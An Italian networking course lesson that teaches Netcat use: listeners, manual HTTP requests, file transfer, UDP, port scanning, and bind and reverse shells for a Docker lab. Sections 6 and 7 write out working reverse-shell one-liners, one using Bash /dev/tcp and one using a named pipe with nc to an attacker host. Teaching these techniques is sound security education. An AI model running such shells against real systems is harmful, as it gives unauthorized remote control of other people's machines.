## **Lezione 4: Netcat, bind shell, reverse shell e trasferimento file**

### **1. Cos'è Netcat**

Netcat (`nc`) è uno strumento da linea di comando per creare connessioni TCP o UDP senza imporre un protocollo applicativo specifico. In pratica espone una socket grezza al terminale.

Può essere usato per:

- aprire un listener su una porta;
- connettersi a un host/porta;
- inviare stringhe;
- testare servizi;
- trasferire file;
- fare port scanning basilare;
- costruire bind shell e reverse shell in laboratorio.

> 📌 Netcat è il "coltellino svizzero" delle socket da terminale: non interpreta HTTP, FTP o Telnet; mette solo in comunicazione stdin/stdout con una connessione di rete.

### **2. Client e server TCP**

Modalità listener:

```bash
nc -l 8080
```

oppure, nelle varianti che lo richiedono:

```bash
nc -l -p 8080
```

Connessione da client:

```bash
nc 192.168.100.10 8080
```

Invio di una stringa:

```bash
echo "ciao" | nc 192.168.100.10 12345
```

Listener che invia una stringa al client appena si collega:

```bash
echo "ciao" | nc -l -p 12345
```

> ⚠️ Esistono varianti diverse di Netcat: GNU netcat, OpenBSD netcat, Ncat di Nmap. Alcune opzioni cambiano. Se un comando non funziona, controlla `nc -h`.

### **3. Test manuale HTTP**

Poiché Netcat apre una connessione TCP grezza, può essere usato per parlare manualmente con un server HTTP:

```bash
nc example.com 80
```

Poi si digita:

```http
HEAD / HTTP/1.0

```

La riga vuota finale chiude gli header HTTP/1.0. Il server risponde con status line e header.

Questo esercizio è utile perché rende visibile che HTTP è testo sopra TCP: Netcat non "sa" HTTP, siamo noi a scrivere i byte applicativi corretti.

### **4. `ifconfig`, `ip addr` e interfacce**

Le slide citano `ifconfig -a`, comando storico per mostrare tutte le interfacce. Su Linux moderno è preferibile:

```bash
ip addr
ip link
ip route
```

Un'interfaccia è utilizzabile a livello TCP/IP se:

- è `UP`;
- ha un indirizzo IP;
- ha una route coerente per raggiungere la destinazione.

Modificare IP manualmente con comandi come:

```bash
sudo ifconfig eth0 10.0.2.16
```

può rompere la rete della VM/container. Nei laboratori si lavora dentro container e snapshot proprio per poter ripartire.

> ⚠️ Se un esperimento altera lo stack di rete, non improvvisare troppe correzioni: `docker compose down && docker compose up -d` o il riavvio della VM sono spesso la strada più pulita.

### **5. Bind shell e reverse shell**

Le slide introducono bind shell e reverse shell con un diagramma visuale.

<!-- INSERT INSTRUCTOR SLIDE/DIAGRAM HERE -->

Una **bind shell** apre una shell sulla vittima e la mette in ascolto su una porta. L'attaccante si collega alla vittima.

Una **reverse shell** fa il contrario: la vittima apre una connessione verso l'attaccante e collega la propria shell a quella connessione.

> 📌 La reverse shell è spesso più efficace in presenza di firewall/NAT, perché molte reti bloccano connessioni entranti verso la vittima ma permettono connessioni uscenti.

### **6. Reverse shell Bash con `/dev/tcp`**

Sull'attaccante:

```bash
nc -lnv 9090
```

Sulla vittima:

```bash
/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1
```

Significato:

- `/bin/bash -i` avvia Bash interattiva;
- `> /dev/tcp/10.9.0.1/9090` redirige stdout verso una connessione TCP;
- `0<&1` fa arrivare stdin dalla stessa connessione;
- `2>&1` manda stderr sullo stesso canale.

Quindi input, output ed errori della shell passano sulla socket TCP.

> ⚠️ Questa è una tecnica offensiva. Nel nostro contesto si usa solo dentro il laboratorio Docker/VM per capire TCP session hijacking e post-exploitation didattica.

### **7. Named pipe e file descriptor**

Le slide citano:

```bash
mknod /tmp/backpipe p
```

oppure:

```bash
mkfifo /tmp/backpipe
```

Una named pipe/FIFO è una pipe con nome nel filesystem. Permette di collegare processi attraverso un percorso file.

File descriptor standard:

- `0` = stdin;
- `1` = stdout;
- `2` = stderr.

Pattern concettuale:

```bash
/bin/sh 0</tmp/backpipe | nc attacker_ip 4444 1>/tmp/backpipe
```

Qui:

- la shell legge input dalla pipe;
- l'output della shell va a Netcat;
- l'output di Netcat torna nella pipe;
- si crea un circuito tra shell e connessione TCP.

> 💡 Capire `0`, `1`, `2`, `<`, `>`, `|` è essenziale: molte tecniche di laboratorio non sono "magia", ma redirezioni di file descriptor.

### **8. Port scanning con Netcat**

Netcat può testare porte con modalità zero-I/O:

```bash
nc -zv 192.168.1.2 20-25
```

Interpretazione tipica:

- `succeeded` indica porta raggiungibile/aperta;
- `Connection refused` indica host raggiunto ma porta chiusa;
- timeout o assenza risposta può indicare filtraggio, host non raggiungibile o pacchetti persi.

Esempio concettuale:

```text
port 20 failed: Connection refused
port 21 failed: Connection refused
port 22 succeeded
port 23 failed: Connection refused
```

Conclusione: SSH su `22` è aperto, le altre porte testate sono chiuse o rifiutate.

> ⚠️ Per scansioni sistematiche useremo `nmap`; Netcat serve per test rapidi e per capire cosa succede a livello socket.

### **9. Trasferire file con Netcat**

Sul ricevente:

```bash
nc -l -p 3000 > receivedfile
```

Sul mittente:

```bash
cat sendfile | nc 192.168.1.2 3000
```

La connessione TCP trasporta byte senza metadata: nome file, permessi e integrità non sono gestiti da Netcat. Se vuoi verificare:

```bash
sha256sum sendfile
sha256sum receivedfile
```

> 📌 Netcat trasferisce byte, non "file" in senso alto livello. Il file nasce perché redirigiamo stdout su disco.

### **10. Netcat con UDP**

Per usare UDP:

```bash
nc -4 -u -l 2389
```

Client:

```bash
nc -4 -u localhost 2389
```

Verifica:

```bash
netstat -anu | grep 2389
ss -anu | grep 2389
```

UDP non ha connessione TCP, handshake o stato affidabile. Alcuni strumenti mostrano comunque una pseudo-associazione locale quando un socket UDP ha comunicato con un peer.

> ✅ In questa lezione Netcat è il ponte tra teoria TCP/UDP e pratica: listener, connessione, porte, payload, redirezioni e shell diventano osservabili da terminale.

